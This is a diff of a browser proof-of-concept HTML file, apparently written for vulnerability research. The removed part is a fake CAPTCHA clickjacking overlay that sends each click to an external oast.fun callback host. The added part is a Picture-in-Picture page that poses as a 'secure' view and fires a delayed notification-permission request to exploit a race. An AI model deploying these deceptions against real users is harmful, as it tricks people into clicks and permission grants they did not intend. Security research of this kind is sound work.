@@ -1,25 +1,27 @@
-<!-- CAPTCHA-LIKE Deception -->
-<div style="text-align:center; margin-top:120px;">
-  <label><input type="checkbox" id="captchaBox"> Saya bukan robot</label>
-</div>
+<!-- pip-permission-prompt-bug102.html -->
+<button id="start">Start PoC</button>
 
 <script>
-  const overlay2 = document.createElement('div');
-  overlay2.style.position = 'absolute';
-  overlay2.style.top = '120px';
-  overlay2.style.left = 'calc(50% - 100px)';
-  overlay2.style.width = '200px';
-  overlay2.style.height = '40px';
-  overlay2.style.zIndex = '9999';
-  overlay2.style.cursor = 'pointer';
-  overlay2.style.background = 'rgba(0,0,0,0.01)';
-  overlay2.onclick = () => {
-    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/captcha-bypass', {
-      method: 'POST',
-      body: JSON.stringify({ click: 'captcha-deceived', ts: Date.now() }),
-      headers: { 'Content-Type': 'application/json' }
+async function runPoC() {
+  const pipWin = await documentPictureInPicture.requestWindow();
+  pipWin.document.body.innerHTML = `
+    <h1 style="font-family:sans-serif;">🔒 Secure PiP View</h1>
+    <p>This view seems trusted, but...</p>
+  `;
+
+  // Delay sedikit untuk memicu race condition
+  setTimeout(() => {
+    Notification.requestPermission().then(p => {
+      alert("Permission result: " + p);
     });
-    alert("⚠️ You just clicked a hidden overlay!");
-  };
-  document.body.appendChild(overlay2);
+  }, 1000);
+}
+
+document.getElementById('start').onclick = () => {
+  if ('documentPictureInPicture' in window) {
+    runPoC();
+  } else {
+    alert('Your browser does not support documentPictureInPicture');
+  }
+};
 </script>
